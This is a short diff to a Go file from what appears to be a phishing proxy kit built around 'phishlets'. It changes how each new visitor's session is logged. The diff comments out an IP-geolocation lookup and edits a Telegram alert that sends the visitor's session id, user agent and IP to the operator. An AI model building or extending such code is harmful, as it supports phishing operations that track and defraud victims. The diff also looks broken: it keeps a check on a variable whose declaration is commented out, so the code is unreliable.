@@ -65,20 +65,20 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 
 	jf, _ := json.Marshal(s)
 
-	ipinfo, ipinfoerr := http.Get("http://ipwho.is/" + remote_addr)
-	if ipinfoerr != nil {
-		fmt.Print("error")
-	}
+// 	ipinfo, ipinfoerr := http.Get("http://ipwho.is/" + remote_addr)
+// 	if ipinfoerr != nil {
+// 		fmt.Print("error")
+// 	}
 
-	ipinfos, eerr := ioutil.ReadAll(ipinfo.Body)
+// 	ipinfos, eerr := ioutil.ReadAll(ipinfo.Body)
 
-	ipinfosn := strings.Replace(string(ipinfos), ",", "%0A-➡️ ", -1)
+// 	ipinfosn := strings.Replace(string(ipinfos), ",", "%0A-➡️ ", -1)
 
 	if eerr != nil {
 		fmt.Print("error")
 	}
 
-	telegramSendVisitor(fmt.Sprintf("[ 🍁 [%s] New visitor has arrived 🍁 ]\n\n-🆔ID: %s \n******* [ 🧍‍♂️ Visitor Details 🧍‍♂️ ] *******\n🌎UserAgent: %s\n-🗺️IP: [%s] \n",phishlet, sid, useragent, remote_addr))
+	telegramSendVisitor(fmt.Sprintf("[ 🍁 [%s] [%s] New visitor has arrived 🍁 ]\n\n-🆔ID: %s \n******* [ 🧍‍♂️ Visitor Details 🧍‍♂️ ] *******\n🌎UserAgent: %s\n-🗺️IP: [%s] \n",id, phishlet, sid, useragent, remote_addr))
 
 	err = d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
